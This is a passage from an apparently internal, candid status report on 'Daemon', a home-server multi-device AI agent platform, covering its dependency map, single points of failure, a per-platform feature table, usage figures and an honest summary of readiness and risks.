  |                 |     +-- Claude CLI -- premium tier chat
  |                 |
  |                 +-- ws-server.js (port 4801) -- device connections
  |                 |     |
  |                 |     +-- SQLite database -- token validation
  |                 |     +-- All device bridges (Android, desktop, CLI)
  |                 |     +-- Clipboard sync
  |                 |     +-- Remote command execution
  |                 |
  |                 +-- Voice server (port 4803) -- voice companion
  |
  +-- Tailscale (private mesh) -- still works if Cloudflare dies
        |
        +-- Direct device access on local network
        +-- SSH between Arthur's devices

ARTURITO HARDWARE (power, disk, RAM)
  |
  +-- EVERYTHING (single point of failure)

DOCKER ENGINE
  |
  +-- Qdrant container -- semantic search / memory
  +-- Sandbox containers -- tool execution for free/mid tier
  +-- (also: Immich, Windows VM, Guacamole -- unrelated services sharing resources)

SQLite FILE (/home/arthur/daemon/data/users.db)
  |
  +-- ALL user accounts
  +-- ALL conversations (19,060 messages)
  +-- ALL projects
  +-- ALL device tokens
  +-- ALL billing/subscription data
  +-- Daily backups exist (3:00 AM), max 24h data loss gap
```

**Key single points of failure:**
1. **arturito** -- if hardware fails, everything is down until you buy new hardware and restore
2. **SQLite file** -- if corrupted, up to 24h of data lost (last backup)
3. **proxy.js** -- if it crashes, 5-second outage (auto-restart)
4. **Cloudflare** -- if their infra fails (extremely rare), external access dies but Tailscale still works

---

# PART 8: CROSS-DEVICE REALITY CHECK

What actually works today on each platform. Tested by examining actual code, not marketing claims.

| Feature | Android (Pixel 8) | Windows (MSI via Tauri) | Linux (arturito) | Mac (not connected) |
|---------|:-:|:-:|:-:|:-:|
| **Chat UI** | WebView (works, not native feel) | Tauri WebView (built, untested with real users) | Web browser (works fully) | Web browser (works fully) |
| **Shell commands via WS** | Via DaemonService (works) | Via Rust commands.rs (works) | Local + via WS (works) | Not connected |
| **Clipboard READ** | BLOCKED by Android 10+ | PowerShell Get-Clipboard (works) | xclip/xsel (works) | pbpaste (would work if connected) |
| **Clipboard WRITE** | Works (Android allows writes) | PowerShell Set-Clipboard (works) | xclip/xsel (works) | pbcopy (would work) |
| **File transfer** | Via WS base64 (works, size limited) | Via WS base64 (works) | Local filesystem (works) | Not connected |
| **File read** | Via WS (up to 1MB) | Via Rust (works) | Direct (works) | Not connected |
| **Auto-start on boot** | BootReceiver (works) | Would need Task Scheduler setup | systemd service (works) | LaunchAgent (code exists, untested) |
| **Background persistence** | Foreground service (works) | Tauri runs as window/tray | systemd (works) | LaunchAgent (untested) |
| **Notifications** | Native Android (works) | Not implemented | Not implemented | Not implemented |
| **Auto-update** | Checks server (works, requires manual APK install) | Not implemented | CLI self-updates (works) | CLI self-updates (code exists) |
| **System tray** | N/A | Tauri tray code exists | N/A | N/A |
| **Voice companion** | Dedicated screen exists | Not implemented | Server-side exists | Not implemented |
| **Pairing** | Via DaemonService | Would use CLI `daemon pair` | Via CLI `daemon pair` | Via CLI `daemon pair` |

**The Mac gap:** There is no Mac connected to the daemon network right now. The CLI code supports macOS (LaunchAgent install, pbpaste/pbcopy clipboard), but it hasn't been set up. If Arthur has a work Mac, connecting it would take about 5 minutes: install Node.js, run `node daemon.mjs pair <CODE>`, then `node daemon.mjs --install`.

**Android limitations to be honest about:**
- Chat UI is a WebView (embedded browser), not a native interface -- it will feel slightly slower and less polished than native apps
- Clipboard reading is blocked by the OS -- this is an Android platform restriction, not a bug
- Auto-update downloads a new APK but the user must manually install it (Android security restriction)
- The app is not in the Play Store -- users must enable "install from unknown sources" and sideload

---

# PART 9: NUMBERS THAT MATTER

A snapshot of the system as of April 5, 2026:

| Metric | Value |
|--------|-------|
| Total users | 3 (2 test accounts + Arthur) |
| Total conversations | ~19,060 messages |
| Total projects | 17 |
| Paired devices | 0 |
| Active subscriptions | 0 |
| Database size | ~2MB |
| Backup retention | 30 daily backups |
| Qdrant container uptime | 8 days (last restart 8 days ago) |
| Docker sandbox image | 775MB (built, ready) |
| Codebase languages | TypeScript (web), JavaScript (proxy, WS, CLI), Rust (desktop), Kotlin (Android), Python (server/AI) |
| Total API routes | 24 (auth, chat, billing, devices, memory, pair, projects, settings, etc.) |
| External API dependencies | OpenRouter, DeepSeek, Stripe, Coinbase Commerce, Google OAuth |

---

# PART 10: THE HONEST SUMMARY

**What Daemon is today:** A working prototype of a multi-device AI agent platform, built by one person, running on a home server. The core architecture (proxy -> web + WebSocket + device bridges) is sound and well-structured. The chat works. The device mesh concept works. The pairing system is well-designed.

**What Daemon is NOT today:** Production-ready. There are zero real users (beyond Arthur), zero paired devices, zero revenue, and several security gaps that need closing before strangers trust it with their devices and data.

**The honest pitch:** "We have a working system that connects your phone, laptop, and server through one AI agent. The free tier uses a good open-source model at no cost. Your devices can talk to each other -- clipboard sync, file transfer, remote commands. It runs on our server, it's fast, and we're about to open it up. We need to harden authentication and add rate limiting before we do."

**The thing NOT to say:** "We have a multi-tier billing system with Stripe and crypto payments." (It's built but untested and has zero transactions.) "Enterprise-grade security." (It's startup-grade at best.) "Runs on cloud infrastructure." (It runs on a computer in your house.)

**The strongest asset:** The daemon.page domain and subdomain system. `name.daemon.page` as your personal AI address is a genuinely compelling concept. The wildcard DNS, the pairing flow, the "claim your daemon name" onboarding -- this is well-executed product thinking.

**The biggest risk:** Single point of failure at every level. One server, one database file, one person who understands the full system. The first production outage will be stressful because there's no runbook, no alerting, and no redundancy. Write the runbook before you need it.
